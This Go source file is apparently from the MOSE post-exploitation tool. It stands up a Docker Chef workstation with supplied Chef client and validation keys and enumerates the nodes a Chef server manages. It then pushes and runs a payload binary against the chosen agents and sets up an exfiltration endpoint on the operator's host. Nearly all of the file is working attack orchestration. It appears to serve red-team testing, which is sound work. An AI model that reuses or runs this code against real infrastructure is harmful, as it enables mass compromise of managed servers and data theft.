// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package chefutils

import (
	"bytes"
	"context"
	"io"
	"os"
	"os/signal"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"
	"time"

	"github.com/master-of-servers/mose/pkg/moseutils"
	"github.com/master-of-servers/mose/pkg/system"
	"github.com/master-of-servers/mose/pkg/userinput"

	"github.com/rs/zerolog/log"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	dockerclient "github.com/docker/docker/client"
	"github.com/markbates/pkger"
)

var (
	signalChan chan os.Signal
	userInput  userinput.UserInput
)

type knifeTemplateArgs struct {
	ChefNodeName        string
	ChefClientKey       string
	TargetOrgName       string
	ChefValidationKey   string
	TargetChefServer    string
	TargetValidatorName string
}

func copyFiles(ctx context.Context, cli *dockerclient.Client, id string, files []string, tarLocation string, dockerLocation string) {
	if _, err := system.ArchiveFiles(files, tarLocation); err != nil {
		log.Fatal().Err(err).Msg("")
	}

	reader, err := os.Open(tarLocation)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	err = cli.CopyToContainer(ctx, id, dockerLocation, reader, types.CopyToContainerOptions{})
	if err != nil {
		_ = reader.Close()
		log.Fatal().Err(err).Msg("")
	}
	if err := reader.Close(); err != nil {
		log.Error().Err(err).Msg("Failed closing tar archive")
	}
}

func simpleRun(ctx context.Context, cli *dockerclient.Client, id string, cmd []string) types.IDResponse {
	execID, err := cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			Cmd: cmd,
		},
	)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	if err = cli.ContainerExecStart(ctx, execID.ID, types.ExecStartCheck{}); err != nil {
		log.Fatal().Err(err).Msg("")
	}

	log.Debug().Msgf("Ran %v in the container.", cmd)

	return execID
}

func build(ctx context.Context, cli *dockerclient.Client) {
	if _, err := system.ArchiveFiles([]string{"dockerfiles"}, "tarfiles/dockerfiles.tar"); err != nil {
		log.Fatal().Err(err).Msg("")
	}

	dockerBuildContext, err := os.Open("tarfiles/dockerfiles.tar")
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	opts := types.ImageBuildOptions{
		Tags:       []string{userInput.ImageName},
		Dockerfile: "dockerfiles/Dockerfile",
	}

	ibr, err := cli.ImageBuild(ctx, dockerBuildContext, opts)
	if err != nil {
		_ = dockerBuildContext.Close()
		log.Fatal().Err(err).Msg("Error building image")
	}

	response, err := io.ReadAll(ibr.Body)
	if err != nil {
		_ = ibr.Body.Close()
		_ = dockerBuildContext.Close()
		log.Fatal().Err(err).Msg("")
	}
	if err := ibr.Body.Close(); err != nil {
		log.Error().Err(err).Msg("Failed closing image build response")
	}
	if err := dockerBuildContext.Close(); err != nil {
		log.Error().Err(err).Msg("Failed closing docker build context")
	}
	log.Debug().Msgf("********* %s **********", ibr.OSType)
	log.Debug().Msg(string(response))
}

func run(ctx context.Context, cli *dockerclient.Client) string {
	hostconfig := &container.HostConfig{}
	if userInput.Rhost != "" {
		hostconfig = &container.HostConfig{
			ExtraHosts: []string{userInput.Rhost},
		}
	}

	resp, err := cli.ContainerCreate(ctx, &container.Config{
		Image:        userInput.ImageName,
		Tty:          true,
		OpenStdin:    true,
		AttachStdin:  true,
		AttachStdout: true,
		AttachStderr: true,
	},
		hostconfig,
		nil,
		userInput.ContainerName,
	)

	if err != nil {
		log.Fatal().Err(err).Msg("Error creating container")
	}

	log.Debug().Msgf("Running container with id %v", resp.ID)

	if err = cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{}); err != nil {
		log.Fatal().Err(err).Msg("")
	}

	return resp.ID
}

func copyToDocker(ctx context.Context, cli *dockerclient.Client, id string) {
	copyFiles(ctx, cli, id, []string{userInput.ChefClientKey, userInput.ChefValidationKey, "dockerfiles/knife.rb"}, "tarfiles/keys_knife.tar", "root/.chef/")

	log.Info().Msg("Running knife ssl fetch, please wait...")
	_ = simpleRun(ctx, cli, id, []string{"knife", "ssl", "fetch"})
}

// runMoseInContainer will upload the MOSE payload for a Chef Workstation
// into a container, so we can run it against a Chef Server
func runMoseInContainer(ctx context.Context, cli *dockerclient.Client, id string, osTarget string) {
	payloadPath := resolvePayloadPath()
	binPath := path.Join("/", path.Base(payloadPath))

	copyFiles(ctx, cli, id, resolveFilesToCopy(payloadPath), "tarfiles/main.tar", "/")
	_ = simpleRun(ctx, cli, id, []string{"chmod", "u+x", binPath})

	nodes := fetchNodesFromContainer(ctx, cli, id, binPath)
	if len(nodes) < 1 {
		log.Log().Msg("No nodes found, exiting...")
		signalChan <- os.Interrupt

		os.Exit(0)
	}
	// Run the MOSE binary on the new workstation that we just created
	agents, err := TargetAgents(nodes, osTarget)
	if err != nil {
		log.Log().Msg("Quitting...")
		signalChan <- os.Interrupt
		os.Exit(1)
	}

	log.Debug().Msgf("Command to be run in the container: %v", append([]string{binPath, "-n"}, agents...))

	runMoseAgainstAgents(ctx, cli, id, binPath, agents)
}

func resolvePayloadPath() string {
	if userInput.FilePath != "" {
		return userInput.FilePath
	}
	return "payloads/chef-linux"
}

func resolveFilesToCopy(payloadPath string) []string {
	filesToCopy := []string{payloadPath}
	if userInput.FileUpload != "" {
		filesToCopy = append(filesToCopy, path.Join("payloads", path.Base(userInput.FileUpload)))
	}
	return filesToCopy
}

func fetchNodesFromContainer(ctx context.Context, cli *dockerclient.Client, id string, binPath string) []string {
	execID, err := cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			AttachStderr: true,
			AttachStdin:  true,
			AttachStdout: true,
			Cmd:          []string{binPath, "-i"},
			Tty:          true,
			Detach:       false,
		},
	)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	log.Debug().Msgf("Running container exec and attach for container ID %v", execID.ID)
	hj, err := cli.ContainerExecAttach(ctx, execID.ID, types.ExecStartCheck{Detach: false, Tty: true})
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	buf := new(bytes.Buffer)
	if _, err = buf.ReadFrom(hj.Reader); err != nil {
		hj.Close()
		log.Fatal().Err(err).Msg("")
	}
	output := buf.String()
	log.Debug().Msg(output)
	nodes := parseNodesFromOutput(output)
	hj.Close()
	return nodes
}

func parseNodesFromOutput(output string) []string {
	agentString := regexp.MustCompile(`(?ms)BEGIN NODE LIST \[(?P<nodes>.*)\] END NODE LIST`)
	names := agentString.SubexpNames()

	nodes := make([]string, 0)
	for _, match := range agentString.FindAllStringSubmatch(output, -1) {
		for groupID, group := range match {
			if names[groupID] != "" {
				moseutils.ColorMsgf("The following nodes were identified: %v", group)
				nodes = append(nodes, strings.Split(group, " ")...)
			}
		}
	}
	return nodes
}

func runMoseAgainstAgents(ctx context.Context, cli *dockerclient.Client, id string, binPath string, agents []string) {
	execID, err := cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			AttachStderr: true,
			AttachStdin:  true,
			AttachStdout: true,
			Cmd:          append([]string{binPath, "-n"}, strings.Join(agents, " ")),
			Tty:          true,
			Detach:       false,
		},
	)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	log.Debug().Msgf("Running container exec and attach for container ID %v", execID.ID)
	hj, err := cli.ContainerExecAttach(ctx, execID.ID, types.ExecStartCheck{Detach: false, Tty: true})
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	if _, err = io.Copy(os.Stdout, hj.Reader); err != nil {
		hj.Close()
		log.Fatal().Err(err).Msg("")
	}
	hj.Close()
}

func removeContainer(cli *dockerclient.Client, id string) {
	ctx := context.Background()
	timeout, _ := time.ParseDuration("10s")
	err := cli.ContainerStop(ctx, id, &timeout)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	err = cli.ContainerRemove(ctx, id, types.ContainerRemoveOptions{Force: true})
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
}

func monitor(cli *dockerclient.Client, id string) {
	cleanupDone := make(chan struct{})
	signal.Notify(signalChan, os.Interrupt)
	go func(cli *dockerclient.Client, id string) {
		<-signalChan
		log.Log().Msg("\nReceived an interrupt, stopping services...")
		removeContainer(cli, id)
		close(cleanupDone)
	}(cli, id)
	<-cleanupDone

	os.Exit(0)
}

func generateKnife() {
	knifeArgs := knifeTemplateArgs{
		ChefNodeName:        userInput.ChefNodeName,
		ChefClientKey:       filepath.Base(userInput.ChefClientKey),
		TargetOrgName:       userInput.TargetOrgName,
		ChefValidationKey:   filepath.Base(userInput.ChefValidationKey),
		TargetChefServer:    userInput.TargetChefServer,
		TargetValidatorName: userInput.TargetValidatorName,
	}

	s, err := pkger.Open("/cmd/chef/main/tmpl/knife.tmpl")
	// Build knife.rb using the knife template
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	dat := new(strings.Builder)
	_, err = io.Copy(dat, s)
	if err != nil {
		_ = s.Close()
		log.Fatal().Err(err).Msg("")
	}
	if err := s.Close(); err != nil {
		log.Error().Err(err).Msg("Failed closing knife template")
	}

	t, err := template.New("knife").Parse(dat.String())

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	f, err := os.Create("dockerfiles/knife.rb")
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	err = t.Execute(f, knifeArgs)
	if err != nil {
		_ = f.Close()
		log.Fatal().Err(err).Msg("")
	}
	if err := f.Close(); err != nil {
		log.Error().Err(err).Msg("Failed closing knife.rb")
	}
}

func newDockerClient(ctx context.Context) (*dockerclient.Client, error) {
	cli, err := dockerclient.NewClientWithOpts(dockerclient.FromEnv)
	if err != nil {
		return nil, err
	}
	cli.NegotiateAPIVersion(ctx)
	if _, err := cli.Ping(ctx); err != nil {
		_ = cli.Close()
		return nil, err
	}
	return cli, nil
}

// SetupChefWorkstationContainer will configure and stand up a chef workstation container that MOSE can use
func SetupChefWorkstationContainer(input userinput.UserInput) {
	userInput = input
	signalChan = make(chan os.Signal, 1)
	ctx := context.Background()

	log.Debug().Msgf("Creating exfil endpoint at %v:%v", userInput.LocalIP, userInput.ExfilPort)
	log.Debug().Msgf("Current orgname: %s", userInput.TargetOrgName)

	CreateUploadRoute(userInput)
	log.Info().Msgf("Target organization name: %s", userInput.TargetOrgName)
	generateKnife()
	cli, err := newDockerClient(ctx)

	if err != nil {
		log.Fatal().Err(err).Msg("Could not get docker client")
	}
	defer func() {
		if err := cli.Close(); err != nil {
			log.Error().Err(err).Msg("Failed to close docker client")
		}
	}()
	log.Debug().Msg("Building Workstation container, please wait...")

	build(ctx, cli)

	log.Debug().Msg("Starting Workstation container, please wait...")
	id := run(ctx, cli)

	go monitor(cli, id)

	log.Debug().Msg("Copying keys and relevant resources to workstation container, please wait...")

	copyToDocker(ctx, cli, id)
	log.Debug().Msg("Running MOSE in Workstation container, please wait...")

	runMoseInContainer(ctx, cli, id, userInput.OSTarget)

	log.Debug().Msg("Running MOSE in Workstation container, please wait...")

	removeContainer(cli, id)
}
